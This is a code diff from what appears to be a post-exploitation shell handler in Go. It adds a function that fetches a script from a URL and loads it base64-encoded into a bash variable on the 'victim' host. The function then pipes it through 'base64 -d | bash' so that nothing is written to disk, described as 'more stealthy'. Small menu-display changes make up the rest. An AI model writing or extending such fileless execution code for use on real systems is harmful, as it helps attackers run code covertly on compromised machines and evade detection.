@@ -155,6 +155,78 @@ func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
 	return nil
 }
 
+// RunScriptInMemory downloads script locally, loads to bash variable (in-memory on victim), executes
+// This avoids writing script to disk on victim (more stealthy)
+// scriptSource: URL or local path to script file
+// args: arguments to pass to the script
+func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var scriptPath string
+	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
+		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		scriptPath = scriptSource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Generate unique variable name
+	varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
+
+	// Upload script to bash variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.UploadToVariable(context.Background(), scriptPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Build args
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " -- " + strings.Join(args, " ")
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing script (in-memory) and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure variable is fully loaded
+		time.Sleep(200 * time.Millisecond)
+
+		// Execute from variable: decode base64 and pipe to bash
+		// The variable contains base64-encoded script, so we decode and execute
+		cmd := fmt.Sprintf("echo \"$%s\" | base64 -d | bash -s%s", varName, argsStr)
+		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			return
+		}
+
+		// Cleanup variable (unset removes from memory)
+		s.Handler.SendCommand(fmt.Sprintf("unset %s\n", varName))
+	}()
+
+	return nil
+}
+
 // RunBinary downloads (if URL), uploads to victim, makes executable, runs
 // Same as RunScript but for binary executables (no bash interpreter)
 func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
@@ -677,7 +749,8 @@ func (m *Manager) handleModulesList() {
 		}
 		lines = append(lines, ui.CommandHelp(cat))
 		for _, mod := range categories[cat] {
-			line := fmt.Sprintf("%-15s - %s", mod.Name(), mod.Description())
+			modeSymbol := ui.ExecutionModeSymbol(mod.ExecutionMode())
+			line := fmt.Sprintf("%s %-15s - %s", modeSymbol, mod.Name(), mod.Description())
 			lines = append(lines, ui.Command(line))
 		}
 		lines = append(lines, "")
@@ -687,6 +760,9 @@ func (m *Manager) handleModulesList() {
 	if len(lines) > 0 && lines[len(lines)-1] == "" {
 		lines = lines[:len(lines)-1]
 	}
+
+	// Add legend at the bottom
+	lines = append(lines, ui.ExecutionModeLegend())
 
 	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Available Modules", ui.SymbolGem), lines))
 }
